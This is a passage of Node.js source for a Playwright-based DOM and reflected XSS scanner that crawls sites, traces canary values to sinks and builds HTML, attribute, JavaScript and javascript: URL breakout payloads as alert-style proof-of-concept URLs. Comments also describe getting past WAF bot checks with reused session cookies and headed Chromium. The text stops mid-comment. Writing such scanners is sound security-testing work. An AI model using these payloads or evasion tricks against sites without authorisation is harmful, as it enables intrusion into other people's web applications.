#!/usr/bin/env node
'use strict';

// Node.js port of mthook.py — a DOM XSS scanner built on Playwright.
//
// This version drops the Python orchestrator's *hang* machinery — no watchdog
// thread, no node-driver SIGKILL, no per-worker pid tracking — because Node's
// Playwright driver is in-process on a single event loop, so a hung/dead
// out-of-process driver leaking OS threads can't happen here.
//
// It KEEPS the crash/memory resilience, because a Chromium process crash (OOM
// after thousands of pages, or a page that triggers "Target crashed") applies
// equally to Node: each worker owns its own browser, recycles it every
// BROWSER_REFRESH_INTERVAL URLs to cap memory growth, and relaunches it when a
// closed/crashed-browser error surfaces (see isClosedError). Without this a
// long run eventually kills the browser and every remaining URL just throws
// "Target ... has been closed" into a dead process.

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const readline = require('readline');
const { parseArgs } = require('util');
const yaml = require('js-yaml');
const parse5 = require('parse5');
const { chromium } = require('playwright');

const ROOT = __dirname;
const config = yaml.load(fs.readFileSync(path.join(ROOT, 'config.yaml'), 'utf8'));

let preloadjs = '';
let injectjs = '';
let stage1_wait = 0;

let outputStream = null;
let debug_mode = false;
let dedup = false;
let extra_headers = {};
// Path to a Playwright storageState JSON (cookies + localStorage) captured from
// a real, WAF-passed session. When set, every context loads it and cookies are
// NOT cleared between URLs (clearing would drop the anti-bot cookie).
let storage_state_path = null;
// Run browsers visibly (needs a display). Headed Chromium drops the
// "HeadlessChrome" client-hint brand, which some WAFs block on.
let headed = false;
// Fixed viewport {width, height} from --viewport. null keeps Playwright's default.
let viewport = null;

const BLOCKED_RESOURCE_TYPES = new Set(['image', 'media', 'font']);
const DOMAIN_MAX_ERRORS = 10;
const BROWSER_REFRESH_INTERVAL = 50;  // URLs per browser before recycle (caps Chromium memory)
const STAGE1_NETIDLE_MS = 3000;       // default post-commit networkidle window when -w is not set

// --- crawl mode (-c DEPTH) state: JS is single-threaded between awaits, so
// plain variables/Set suffice (no locks needed, unlike mthook.py). ---
let crawl_depth = 0;              // 0 = off; else max link-follow depth
let crawl_max_urls = 500;         // cap on total URLs scanned (seeds + discovered)
const crawlHosts = new Set();     // seed hosts — crawl stays inside them
const crawlSeen = new Set();      // URLs ever enqueued (dedup)
let crawlEnqueued = 0;            // total enqueued, for the cap
let crawlPending = 0;             // shifted but not yet link-harvested
// Link targets pointless to scan as documents; the main-doc content-type check
// would skip them anyway, this just saves the browser roundtrip.
const CRAWL_SKIP_EXT = new Set(('jpg jpeg png gif webp svg ico bmp avif css js mjs map '
    + 'mp4 webm mkv mov avi mp3 wav ogg flac woff woff2 ttf otf eot zip gz tgz bz2 7z '
    + 'rar tar pdf doc docx xls xlsx ppt pptx csv').split(' '));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function crawlFilterLinks(links) {
    // Keep http(s) links on a seed host, strip fragments, drop obvious asset
    // URLs, dedupe. Cross-host links are ignored — the crawl stays on site.
    const out = [];
    const seen = new Set();
    for (const h of (links || [])) {
        let u;
        try { u = new URL(h); } catch { continue; }
        if ((u.protocol !== 'http:' && u.protocol !== 'https:') || !crawlHosts.has(u.host)) continue;
        const ext = u.pathname.split('.').pop().toLowerCase();
        if (CRAWL_SKIP_EXT.has(ext)) continue;
        u.hash = '';
        const s = u.toString();
        if (!seen.has(s)) { seen.add(s); out.push(s); }
    }
    return out;
}

function crawlEnqueue(queue, urls, fromDepth) {
    // Queue harvested links for scanning: depth-limited, deduped, capped.
    // Links go to the TAIL of the FIFO queue, so the crawl is breadth-first —
    // all depth-N pages are scanned before any depth-N+1 page. Each harvested
    // batch is shuffled first (Fisher-Yates), so within a depth level the
    // order (and thus what --max-urls keeps when it trims the deepest level)
    // is random: repeat runs sample different pages instead of always
    // drilling the same DOM order. (Mirrors mthook.py.)
    if (crawl_depth <= 0 || fromDepth >= crawl_depth) return;
    const arr = [...urls];
    for (let i = arr.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    for (const u of arr) {
        if (crawlSeen.has(u) || crawlEnqueued >= crawl_max_urls) continue;
        crawlSeen.add(u);
        crawlEnqueued++;
        queue.push([u, fromDepth + 1]);
    }
}
const URL_HANG_TIMEOUT = 60000;       // max time WITHOUT progress per URL (stage 2 beats as payloads
                                      // complete); page.evaluate() has no internal timeout, so a wedged
                                      // renderer (busy JS loop) would hang a worker forever
const CLOSE_TIMEOUT = 10000;          // ceiling on context/browser close so recycle can't hang on a wedged browser

const domain_errors = new Map();
const domain_sinks = new Map();      // domain -> Set of hashes
const domain_reflected = new Map();  // domain -> Set of hashes

// ---------------------------------------------------------------------------
// small utilities
// ---------------------------------------------------------------------------

function eprint(...args) {
    process.stderr.write(args.join(' ') + '\n');
}

function md5(s) {
    return crypto.createHash('md5').update(s, 'utf8').digest('hex');
}

function netloc(urlStr) {
    // Mirror urlparse().netloc for the cases we care about; '' when relative.
    try {
        return new URL(urlStr).host;
    } catch {
        return '';
    }
}

function uniq(arr) {
    return [...new Set(arr)];
}

function unquote(s) {
    // Mirror Python's urllib.parse.unquote: decode %XX escapes but never throw
    // on a malformed sequence the way decodeURIComponent does — leave those
    // intact and decode only the valid ones.
    if (!s) return '';
    if (s.indexOf('%') === -1) return s;
    try {
        return decodeURIComponent(s);
    } catch {
        return s.replace(/%[0-9a-fA-F]{2}/g, m => {
            try { return decodeURIComponent(m); } catch { return m; }
        });
    }
}

function domain_is_blocked(domain) {
    return (domain_errors.get(domain) || 0) >= DOMAIN_MAX_ERRORS;
}

function domain_record_error(domain) {
    const n = (domain_errors.get(domain) || 0) + 1;
    domain_errors.set(domain, n);
    return n;
}

// ---------------------------------------------------------------------------
// noise filter — drop URL-copy sinks (share widgets, trackers, embeds)
// ---------------------------------------------------------------------------

// Sinks that only ever ride along with the page's own URL — the canary in
// their value came from location, so no attacker-controlled source flowed in.
// location_* are exempt on purpose (open-redirect leads), JS sinks and
// script_text can't be a pure URL copy. (Keep in sync with JS_SINKS.)
const NOISE_EXEMPT_SINKS = new Set(['eval', 'func', 'setTimeout', 'setInterval',
    'script_text', 'location_nav', 'location_assign', 'location_replace',
    'location_href']);

// URL-attribute sinks (as emitted by preload.js) whose value is a resolved URL.
const NOISE_URL_ATTR_SINKS = new Set(['a_href', 'image_src', 'script_src',
    'iframe_src', 'form_action']);

function filter_noise_sinks(sinks, current_url = '', dom_url = null) {
    // Drop URL-copy sinks: share widgets, trackers, captcha/embed href params —
    // values that embed the page's own URL. Signal: the canary sits MID-URL,
    // immediately followed by query/fragment continuation (`&`, `#`, or their
    // percent-encoded forms), because the page glued its full location into a
    // bigger URL. Genuine flows have the canary free-standing or at a value end
    // (breakout-capable), so they survive. For pure URL-attribute sinks
    // (a_href, *_src, ...) a value-end canary is also noise — no markup to break
    // out of — UNLESS the canary starts the whole value (full-value control =>
    // javascript: URL possible => keep). Analysis runs on once-unquoted code so
    // single- and double-encoded embeds normalize to the same shape.
    if (!sinks || !sinks.length) return [...(sinks || [])];
    const canary = config.canary;
    const kept = [];
    for (const s of sinks) {
        if (NOISE_EXEMPT_SINKS.has(s.sink)) {
            kept.push(s);
            continue;
        }
        const decoded = unquote(s.code || '');
        let url_attr = NOISE_URL_ATTR_SINKS.has(s.sink);
        if (s.sink && s.sink.startsWith('setAttribute_')) {
            const parts = s.sink.split('_');
            const attr = parts.length >= 3 ? parts.slice(2).join('_') : '';
            url_attr = ['href', 'src', 'action', 'formaction', 'content'].includes(attr);
        }
        if (url_attr && decoded.replace(/^\s+/, '').replace(/^<+/, '').startsWith(canary)) {
            kept.push(s);  // full-value control — javascript: URL candidate
            continue;
        }
        const rgx = new RegExp(canary + '[a-zA-Z0-9_.\\[\\]\\-]+', 'g');
        const occ = [];
        let m;
        while ((m = rgx.exec(decoded)) !== null) {
            const before = decoded.slice(0, m.index);
            let tail = decoded.slice(m.index + m[0].length);
            // skip the wrapped canary's closing `>` (raw or %3E)
            if (tail.startsWith('>')) {
                tail = tail.slice(1);
            } else if (tail.slice(0, 3).toLowerCase() === '%3e') {
                tail = tail.slice(3);
            }
            if (url_attr) {
                // for URL-attribute sinks only query position can be noise:
                // canary in path/authority/fragment of the resolved value means
                // the page assigned (nearly) the whole value — attacker
                // controlled, e.g. `a.href = <input>` resolving to a path. `?`
                // must be the last URL separator before the canary for it to
                // sit inside the query.
                const q = before.lastIndexOf('?');
                const h = before.lastIndexOf('#');
                if (q === -1 || (h !== -1 && h > q)) {
                    occ.push('free');
                    continue;
                }
            }
            // mid: more query params follow (`&x=` or encoded forms). A bare `&`
            // without `name=` (HTML entities like `&nbsp;`) is NOT continuation
            // — that's markup after a free-standing value.
            if (/^&[A-Za-z0-9_.%\-]+(?:=|%3D)/i.test(tail)
                    || ['%26', '%23'].includes(tail.slice(0, 3).toLowerCase())
                    || tail.startsWith('#')) {
                occ.push('mid');
            } else if (['"', "'", '>', '%22', '%27', '%3e', '%3E'].some(p => tail.startsWith(p))
                    || tail === '') {
                // value end: ambiguous for markup sinks (breakout-capable),
                // plain noise for url-attr sinks (nothing to break out of)
                occ.push(url_attr ? 'mid' : 'end');
            } else {
                occ.push('free');
            }
        }
        // noise only when every occurrence rides inside an embedded URL
        // (mid-param or its tail end) and none is free-standing markup
        if (occ.includes('mid') && !occ.includes('free')) {
            continue;
        }
        kept.push(s);
    }
    return kept;
}

// ---------------------------------------------------------------------------
// dedup
// ---------------------------------------------------------------------------

function filter_new_sinks(domain, sinks, current_url = '') {
    // Return only sinks not yet seen for this domain. Hashes sink+sources+code,
    // with the current URL (raw and URL-encoded) stripped from code first.
    if (!sinks || !sinks.length) return [];
    if (!dedup) return [...sinks];
    const out = [];
    const url_enc = current_url ? encodeURIComponent(current_url) : '';
    let seen = domain_sinks.get(domain);
    if (!seen) { seen = new Set(); domain_sinks.set(domain, seen); }
    for (const s of sinks) {
        let code = s.code || '';
        if (current_url) {
            code = code.split(current_url).join('').split(url_enc).join('');
        }
        const payload = (s.sink || '') + '|' + [...(s.sources || [])].sort().join(',') + '|' + code;
        const h = md5(payload);
        if (!seen.has(h)) {
            seen.add(h);
            out.push(s);
        }
    }
    return out;
}

function filter_new_reflected(domain, reflected) {
    // Return only reflected hits not yet seen for this domain. Hashes
    // key+context+tag+attr.
    if (!reflected || !reflected.length) return [];
    if (!dedup) return [...reflected];
    const out = [];
    let seen = domain_reflected.get(domain);
    if (!seen) { seen = new Set(); domain_reflected.set(domain, seen); }
    for (const r of reflected) {
        let keys = r.key || '';
        if (Array.isArray(keys)) keys = [...keys].sort().join(',');
        const payload = [keys, r.context || '', r.tag || '', r.attr || ''].join('|');
        const h = md5(payload);
        if (!seen.has(h)) {
            seen.add(h);
            out.push(r);
        }
    }
    return out;
}

// ---------------------------------------------------------------------------
// reflected-canary discovery (server-side reflection in the raw HTML)
// ---------------------------------------------------------------------------

function canaryRegex(canary) {
    return new RegExp(canary + '([a-zA-Z0-9_.\\[\\]\\-]+)', 'g');
}

function keysFrom(text, rgx) {
    rgx.lastIndex = 0;
    const keys = [];
    let m;
    while ((m = rgx.exec(text)) !== null) keys.push(m[1]);
    return uniq(keys);
}

function isElement(node) {
    return node.tagName !== undefined && node.nodeName !== '#text'
        && node.nodeName !== '#comment' && node.nodeName !== '#document'
        && node.nodeName !== '#document-fragment' && node.nodeName !== '#documentType';
}

function snippet(node) {
    let s;
    try {
        s = isElement(node) ? parse5.serializeOuter(node) : parse5.serialize(node);
    } catch {
        return '';
    }
    if (!s) return '';
    return s.replace(/\s+/g, ' ').trim().slice(0, 300);
}

function find_reflected_canaries(raw_html, canary) {
    const results = [];
    const rgx = canaryRegex(canary);
    let doc;
    try {
        doc = parse5.parse(raw_html);
    } catch {
        return results;
    }

    // HTML parsers lowercase tag names, so a raw-reflected `<canary+Key>`
    // surfaces below as a lowercased tag (rivalssscontactMsg ->
    // rivalssscontactmsg) while the raw body still holds the key's true
    // case. Build lower->original once and restore it on tag-name hits, or
    // stage 2 delivers the payload as &contactmsg=... — a param the server
    // never reads, so mixed-case reflected keys can never confirm. Text
    // and attribute values keep their case through the parse (and reflect
    // what the server actually emits), so they are NOT remapped.
    const origCase = new Map();
    for (const k of keysFrom(raw_html, rgx)) {
        const low = k.toLowerCase();
        if (!origCase.has(low)) origCase.set(low, k);
    }
    const orig = (k) => origCase.get(k.toLowerCase()) || k;

    function walk(node) {
        for (const child of (node.childNodes || [])) {
            if (isElement(child)) {
                const tag = (child.tagName || child.nodeName || '').toLowerCase();

                // tag name itself matches canary — `<canary+key>` reflected
                // unescaped into HTML body and parsed as an unknown element.
                // The parser lowercased the name; restore the key's
                // original case.
                const tagKeys = uniq(keysFrom(tag, rgx).map(orig));
                if (tagKeys.length) {
                    const parent = child.parentNode;
                    const parentTag = (parent && parent.tagName)
                        ? parent.tagName.toLowerCase() : 'html';
                    results.push({ key: tagKeys, context: 'html', tag: parentTag,
                                   code: snippet(parent || child) });
                }

                // attributes
                for (const { name: attrName, value: attrVal } of (child.attrs || [])) {
                    if (!attrVal) continue;
                    const keys = keysFrom(attrVal, rgx);
                    if (keys.length) {
                        results.push({ key: keys, context: 'attr', tag,
                                       attr: attrName, code: snippet(child) });
                    }
                }

                walk(child);
            } else if (child.nodeName === '#text') {
                const text = child.value || '';
                if (!text) continue;
                const keys = keysFrom(text, rgx);
                if (keys.length) {
                    const parent = child.parentNode;
                    const ptag = (parent && parent.tagName)
                        ? parent.tagName.toLowerCase() : '';
                    const ctx = ptag === 'script' ? 'script'
                        : ptag === 'style' ? 'style' : 'html';
                    results.push({ key: keys, context: ctx, tag: ptag,
                                   code: snippet(parent || child) });
                }
            }
        }
    }

    walk(doc);
    return results;
}

function get_reflected_payloads(reflected, canary) {
    // Generate confirmation payloads for server-side reflected canaries.
    // Dedup by (key, ctx_group) so each key gets at most one html/attr payload
    // AND one script payload — the two classes need different payloads.
    const seen = new Set();
    const results = [];
    for (const r of reflected) {
        let keys = r.key || [];
        if (typeof keys === 'string') keys = [keys];
        const ctx = r.context || 'html';
        const ctx_group = ctx === 'script' ? 'script' : 'other';
        for (const key of keys) {
            const dedupKey = key + '\x00' + ctx_group;
            if (!key || seen.has(dedupKey)) continue;
            seen.add(dedupKey);
            let payload;
            if (ctx === 'script') {
                payload = `'"></stYle/</titLe/</teXtarEa/</scRipt/--!><svg id=${key} onload=rsjsstorage.alertfunc(this.id)>`;
            } else {
                payload = `'"></stYle/</titLe/</teXtarEa/</scRipt/--!><svg/onload=rsjsstorage.alertfunc('${key}')>`;
            }
            results.push({ key, sink: 'reflected_' + ctx, ctx: 'html', payload });
        }
    }
    return results;
}

// ---------------------------------------------------------------------------
// URL helpers
// ---------------------------------------------------------------------------

function uniqueQueryKeys(u) {
    return uniq([...u.searchParams.keys()]);
}

function inject_canary_params(urlStr, canary) {
    let u;
    try { u = new URL(urlStr); } catch { return urlStr; }
    const keys = uniqueQueryKeys(u);
    if (!keys.length) return urlStr;
    // `<` + canary + key + `>` — matches rsCanaryValue() in preload.js so
    // jQuery's HTML-vs-text heuristic routes the value through innerHTML.
    const sp = new URLSearchParams();
    for (const k of keys) sp.set(k, '<' + canary + k + '>');
    u.search = sp.toString();
    return u.toString();
}

function build_dom_url(current_url, usp_revealed, canary) {
    // Append revealed USP keys (not already present in the query) as
    // `key=canary+key` pairs.
    if (!usp_revealed || !usp_revealed.length) return current_url;
    let u;
    try { u = new URL(current_url); } catch { return current_url; }
    const existing = new Set([...u.searchParams.keys()]);
    const extra = usp_revealed.filter(k => !existing.has(k));
    if (!extra.length) return current_url;
    for (const k of extra) u.searchParams.append(k, canary + k);
    return u.toString();
}

function minimalQueryEncode(v) {
    // Percent-encode only what breaks a URL query value: % & # + and space.
    // Everything else (quotes, <>, parens, slashes) stays raw so pages that
    // read location.search RAW (regex extraction, no URLSearchParams, no
    // decodeURIComponent) receive the payload's quote characters unencoded
    // and string breakouts still work. Browsers accept those characters raw
    // in the query component. (A raw space can never survive anyway: the
    // browser itself re-encodes it to %20.) Mirrors minimal_query_encode in
    // mthook.py.
    return v.split('%').join('%25').split('&').join('%26')
        .split('#').join('%23').split('+').join('%2B').split(' ').join('%20');
}

function build_payload_url(base_url, key, payload) {
    // Build a PoC URL with `payload` substituted as the value of `key`.
    // For key == '_hash', strip any fragment and append `#<payload>` raw.
    // The value is minimally encoded (see minimalQueryEncode) so raw
    // location.search readers get the quotes intact; other params keep
    // their raw values (a URLSearchParams rebuild would re-encode them).
    if (key === '_hash') {
        return base_url.split('#')[0] + '#' + payload;
    }
    const enc = minimalQueryEncode(payload);
    const hashIdx = base_url.indexOf('#');
    const noHash = hashIdx === -1 ? base_url : base_url.slice(0, hashIdx);
    const hash = hashIdx === -1 ? '' : base_url.slice(hashIdx);
    const qIdx = noHash.indexOf('?');
    const before = qIdx === -1 ? noHash : noHash.slice(0, qIdx);
    const parts = (qIdx === -1 || qIdx === noHash.length - 1) ? []
        : noHash.slice(qIdx + 1).split('&');
    const out = [];
    let replaced = false;
    for (const p of parts) {
        const eq = p.indexOf('=');
        const k = eq === -1 ? p : p.slice(0, eq);
        if (k === key) { out.push(key + '=' + enc); replaced = true; }
        else out.push(p);
    }
    if (!replaced) out.push(key + '=' + enc);
    return before + '?' + out.join('&') + hash;
}

// ---------------------------------------------------------------------------
// context detection + payload generation
// ---------------------------------------------------------------------------

const JS_SINKS = new Set(['eval', 'func', 'setTimeout', 'setInterval', 'script_text']);
const URL_SINKS = new Set(['location_assign', 'location_replace', 'location_href',
    'location_nav', 'a_href', 'form_action', 'iframe_src', 'script_src', 'window_open']);
const HTML_SINKS = new Set(['html']);
const URL_ATTR_NAMES = new Set(['href', 'src', 'action', 'formaction']);

// URL sinks with no element to look for in the DOM: the sink IS the navigation
// (or the window.open call), so they stay statically confirmable when the
// canary controls the whole URL. Every other URL sink writes an attribute on
// an element and needs the DOM-presence check instead. (Mirrors mthook.py.)
const NAV_URL_SINKS = new Set(['location_assign', 'location_replace', 'location_href',
    'location_nav', 'window_open']);

// Runs in the settled stage-2 page. A `javascript:` payload is only worth
// reporting when it still sits at the START of a URL attribute on an element
// connected to the live document — i.e. the PoC URL actually renders a link.
// Starts-with (not substring) so share/self-URL embeds of the payload — which
// land mid-URL, after `?param=` — don't count; that's the same URL-copy shape
// filter_noise_sinks rejects. Two passes:
//   1. walk the light DOM + open shadow roots for attribute carriers
//      (<template> content is a separate inert fragment querySelectorAll never
//      enters — exactly right: not rendered, not clickable);
//   2. re-check the elements preload.js saw receive a canary/payload on a URL
//      attribute (window.__rsUrlSinkEls): isConnected is true inside CLOSED
//      shadow roots too, which pass 1 cannot enter, and re-reading the current
//      attribute catches sanitizers that neutralise the value later.
// Declared as a real function, not a string: Playwright's Node client
// evaluates a string as a bare expression (never calling it, so the arg would
// be lost), unlike the Python binding. Must stay self-contained — it is
// serialized into the page. (Mirrors DOM_PRESENT_JS in mthook.py.)
function dom_present_in_page(wanted) {
    const URL_ATTRS = new Set(['href', 'src', 'action', 'formaction', 'xlink:href']);
    function carries(v) {
        if (typeof v !== 'string' || !v) return null;
        const t = v.replace(/^\s+/, '');
        for (const w of wanted) if (t === w || t.startsWith(w)) return w;
        return null;
    }
    const hits = new Set();
    (function scan(root) {
        for (const el of root.querySelectorAll('*')) {
            for (const a of el.attributes) {
                if (!URL_ATTRS.has(a.name.toLowerCase())) continue;
                const w = carries(a.value);
                if (w) hits.add(w);
            }
            if (el.shadowRoot) scan(el.shadowRoot);
        }
    })(document);
    for (const pair of (window.__rsUrlSinkEls || [])) {
        const el = pair && pair[0], attr = pair && pair[1];
        if (!el || !attr || !el.isConnected) continue;
        let v;
        try { v = el.getAttribute(attr); } catch (e) { v = null; }
        if (v === null || v === undefined) {
            try { v = el[attr === 'xlink:href' ? 'href' : attr]; } catch (e) { v = null; }
        }
        const w = carries(v);
        if (w) hits.add(w);
    }
    return Array.from(hits);
}

function isElementUrlSink(stype) {
    // True for URL sinks that write an attribute on an element (a_href, *_src,
    // form_action, setAttribute_<urlattr>) — as opposed to navigation sinks
    // (location_*, window_open) that act by themselves. (Mirrors
    // is_element_url_sink in mthook.py.)
    if (URL_SINKS.has(stype) && !NAV_URL_SINKS.has(stype)) return true;
    if (stype.startsWith('setAttribute_')) {
        const parts = stype.split('_');
        const attr = parts.length > 2 ? parts.slice(2).join('_') : '';
        return URL_ATTR_NAMES.has(attr);
    }
    return false;
}

function jsKeyArg(key) {
    // A quote-free JS expression evaluating to `key`. Chromium's URL parser
    // percent-encodes ' " ` (and < > space) in query and fragment, so a
    // payload carrying any quote arrives at raw location.search/hash readers
    // percent-encoded and turns into a syntax error — while a regex literal's
    // `.source` survives the URL raw and evaluates to exactly `key`. Keys
    // with regex-syntax chars fall back to String.fromCharCode. Mirrors
    // js_key_arg in mthook.py.
    if (/^[A-Za-z0-9_.\-]+$/.test(key)) return `/${key}/.source`;
    return 'String.fromCharCode(' + [...key].map((c) => c.charCodeAt(0)).join(',') + ')';
}

const JS_PAYLOADS = {
    // {arg} = jsKeyArg(key): quote-free, so payloads still execute when the
    // page receives them raw (undecoded) from location.search/hash. String
    // literal contexts (single/double/backtick) cannot break out without a
    // quote char, so those stay unconfirmable for raw readers — by design,
    // since a real attacker faces the same URL encoding.
    expr: "rsjsstorage.alertfunc({arg});",
    single: "'-rsjsstorage.alertfunc({arg})-'",
    double: "\"-rsjsstorage.alertfunc({arg})-\"",
    backtick: "`-rsjsstorage.alertfunc({arg})-`",
};

function detect_js_context(code, canary, key) {
    // Determine if canary+key sits inside a string literal in JS code.
    // Counts unescaped quotes before the marker — odd count means inside.
    const marker = canary + key;
    const idx = code.indexOf(marker);
    if (idx === -1) return 'expr';
    const before = code.slice(0, idx);
    for (const [qchar, name] of [['"', 'double'], ["'", 'single'], ['`', 'backtick']]) {
        let count = 0;
        let i = 0;
        while (i < before.length) {
            if (before[i] === '\\') { i += 2; continue; }
            if (before[i] === qchar) count++;
            i++;
        }
        if (count % 2 === 1) return name;
    }
    return 'expr';
}

function detect_html_context(code, canary, key) {
    // Determine the attribute-value quoting context of canary+key in HTML code.
    // The HTML5 parser's 'before attribute value state' treats the first char
    // after `=` as the delimiter: `"` → double-quoted, `'` → single-quoted,
    // anything else → unquoted.  The universal payload `'">…` starts with `'`,
    // which *opens* a single-quoted value in the unquoted case and swallows the
    // entire attack.  Returns: 'unquoted' | 'single' | 'double' | 'text'
    const marker = canary + key;
    const idx = code.indexOf(marker);
    if (idx === -1) return 'text';
    let start = idx;
    if (start > 0 && code[start - 1] === '<') start--;
    let j = start - 1;
    while (j >= 0 && ' \t\n\r'.includes(code[j])) j--;
    if (j < 0) return 'text';
    if (code[j] === '=') return 'unquoted';
    if (code[j] === '"' || code[j] === "'") {
        const q = code[j];
        let k = j - 1;
        while (k >= 0 && ' \t\n\r'.includes(code[k])) k--;
        if (k >= 0 && code[k] === '=') return q === '"' ? 'double' : 'single';
    }
    return 'text';
}

function is_url_exploitable(code, canary, key) {
    // True if canary+key controls the full URL or the domain part.
    const marker = canary + key;
    const stripped = code.replace(/^\s+/, '').replace(/^<+/, '');
    if (stripped.startsWith(marker)) return true;
    try {
        const host = new URL(stripped).host;
        if (host && host.includes(canary)) return true;
    } catch { /* relative / not a URL */ }
    return false;
}

function confirm_url_sinks(new_sinks, payloads, dom_payloads, canary) {
    // Confirm URL sinks stage 2 cannot auto-trigger (no real click):
    // - navigation sinks (location_*, window_open): statically, when the canary
    //   controls the whole URL value — these act by themselves, there is no
    //   element to look for (open-redirect / javascript: navigation leads);
    // - element URL sinks (a_href, *_src, form_action, setAttribute_<urlattr>):
    //   only when stage 2 found the payload at the start of a URL attribute of
    //   an element still connected in the settled DOM (dom_payloads, see
    //   DOM_PRESENT_JS). A `javascript:` URL nobody can click is not a finding:
    //   detached <a> URL-parsers, elements discarded when a later async step
    //   fails, and values the page rewrites for non-canary input all stop here.
    // Both paths keep the is_url_exploitable gate (full-value control), so a
    // mid-URL canary never confirms. Element hits come back with via='dom'.
    // (Mirrors confirm_url_sinks in mthook.py.)
    const confirmed = [];
    for (const s of new_sinks) {
        const stype = s.sink;
        const element_based = isElementUrlSink(stype);
        if (!(element_based || URL_SINKS.has(stype))) continue;
        const pool = element_based ? dom_payloads : payloads;
        const code = s.code || '';
        for (const key of (s.sources || [])) {
            if (!is_url_exploitable(code, canary, key)) continue;
            for (const p of pool) {
                if (p.key === key && p.sink === stype) {
                    confirmed.push(element_based ? { ...p, via: 'dom' } : p);
                    break;
                }
            }
        }
    }
    return confirmed;
}

function get_payloads(sink, canary) {
    // Generate payloads for a sink entry. Returns list of {key, sink, ctx, payload}.
    const stype = sink.sink;
    const code = sink.code || '';
    const results = [];
    for (const key of (sink.sources || [])) {
        if (JS_SINKS.has(stype)) {
            const ctx = detect_js_context(code, canary, key);
            const payload = JS_PAYLOADS[ctx].split('{arg}').join(jsKeyArg(key));
            results.push({ key, sink: stype, ctx, payload });
        } else if (URL_SINKS.has(stype)) {
            results.push({ key, sink: stype, ctx: 'url',
                payload: `javascript:rsjsstorage.alertfunc(${jsKeyArg(key)})` });
        } else if (HTML_SINKS.has(stype)) {
            // createElement single-tag shape: code is exactly `<canary+key>`,
            // meaning a jQuery-style $(value) call hit the HTML branch of its
            // HTML-vs-selector heuristic on the wrapped canary (preload.js
            // wraps canaries in <…> on purpose). The confirmation payload must
            // ALSO start with '<' or the heuristic routes it to the selector
            // path at confirm time and nothing executes. No breakout prefix:
            // the canary was the whole fragment, not text inside markup.
            // (Mirrors mthook.py.)
            let payload;
            if (code === `<${canary}${key}>`) {
                payload = `<img/src/onerror=rsjsstorage.alertfunc('${key}')>`;
            } else {
                // Handlers must be quote-free: values that land inside a
                // <script> JSON blob (e.g. ad "slot-data" markup serialized
                // with JSON.stringify) arrive with every " escaped to \", so
                // onerror="fn('k')" parses as an unquoted value starting with
                // a backslash and the fired handler is a JS syntax error.
                // Unquoted onerror=fn('k') — no spaces, single quotes survive
                // JSON untouched — fires in both plain-HTML and JSON-string
                // contexts. Same rationale as the reflected script payload's
                // this.id trick. (Mirrors mthook.py.)
                const htmlCtx = detect_html_context(code, canary, key);
                if (htmlCtx === 'unquoted') {
                    payload = `></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror=rsjsstorage.alertfunc('${key}')>`;
                } else if (htmlCtx === 'single') {
                    payload = `'></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror=rsjsstorage.alertfunc('${key}')>`;
                } else if (htmlCtx === 'double') {
                    payload = `"></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror=rsjsstorage.alertfunc('${key}')>`;
                } else {
                    payload = `'"></stYle/</titLe/</teXtarEa/</scRipt/--!><img/src/onerror=rsjsstorage.alertfunc('${key}')>`;
                }
            }
            results.push({ key, sink: stype, ctx: 'html', payload });
        } else if (stype.startsWith('setAttribute_')) {
            const parts = stype.split('_');
            const attr = parts.length > 2 ? parts.slice(2).join('_') : '';
            if (attr.startsWith('on')) {
                results.push({ key, sink: stype, ctx: 'event',
                    payload: `rsjsstorage.alertfunc(${jsKeyArg(key)})` });
            } else if (URL_ATTR_NAMES.has(attr)) {
                results.push({ key, sink: stype, ctx: 'url',
                    payload: `javascript:rsjsstorage.alertfunc(${jsKeyArg(key)})` });
            }
        }
    }
    return results;
}

function build_inject_js(payloads) {
    // Build preload_inject.js with payload_map {key: payload}. _hash key is
    // separated into hash_payload.
    const payload_map = {};
    let hash_payload = '';
    for (const p of payloads) {
        if (p.key === '_hash') hash_payload = p.payload;
        else payload_map[p.key] = p.payload;
    }
    let js = injectjs;
    js = js.replace('"{{payload_map}}"', JSON.stringify(payload_map));
    js = js.replace('"{{hash_payload}}"', JSON.stringify(hash_payload));
    return js;
}

function emit_confirmed(base_url, confirmed) {
    for (const c of confirmed) {
        const payload = c.payload.split('rsjsstorage.alertfunc').join('alert');
        const poc = build_payload_url(base_url, c.key, payload);
        const line = `${poc}  [sink=${c.sink} ctx=${c.ctx}]${c.via ? ` via=${c.via}` : ''}`;
        process.stdout.write(line + '\n');
        if (outputStream) outputStream.write(line + '\n');
    }
}

// ---------------------------------------------------------------------------
// stage 2 — confirmation
// ---------------------------------------------------------------------------

async function stage2Route(route, request) {
    try {
        if (BLOCKED_RESOURCE_TYPES.has(request.resourceType())) {
            await route.abort();
            return;
        }
    } catch { /* ignore */ }
    try { await route.continue(); } catch { /* ignore */ }
}

function partition_payload_rounds(payloads) {
    // Split payloads into delivery rounds. preload_inject.js ships payloads
    // as payloadMap {key: payload} — one value per param name — so two
    // payloads on one key (one param feeding eval AND innerHTML) clobber
    // down to the last one. The survivor reaches BOTH sinks, and a payload
    // that is wrong for the first sink can throw there (an html breakout
    // inside an eval argument is a SyntaxError) and kill the script before
    // the second sink runs — neither flow confirms. Round r carries each
    // key's (r+1)-th payload, so every key appears at most once per round
    // and each round gets its own stage-2 reload. Pages where all keys are
    // distinct (the common case) collapse to a single round, i.e. the
    // previous behavior and cost. As a side effect this also makes the
    // jsEvals wait satisfiable (it is deduped by key, so
    // `length >= payloads.length` could never reach 2 for two payloads on
    // one key) and the key-based confirmation sound (in a round that ships
    // only one payload for the key, the key in jsEvals can only have come
    // from that payload). (Mirrors mthook.py.)
    const rounds = [];
    const nextRound = new Map();
    for (const p of payloads) {
        const r = nextRound.has(p.key) ? nextRound.get(p.key) : 0;
        nextRound.set(p.key, r + 1);
        while (rounds.length <= r) rounds.push([]);
        rounds[r].push(p);
    }
    return rounds;
}

async function process_url_stage2(context, url, payloads, beat = () => {}) {
    // Reload the same URL with canary params, but preload_inject.js returns
    // payload values via USP hooks and hash. Payloads are delivered in
    // rounds (see partition_payload_rounds): one reload per round, at most
    // one payload per key per reload. Returns [execConfirmed, domPresent]:
    // payload dicts whose alertfunc actually fired, and URL payloads whose
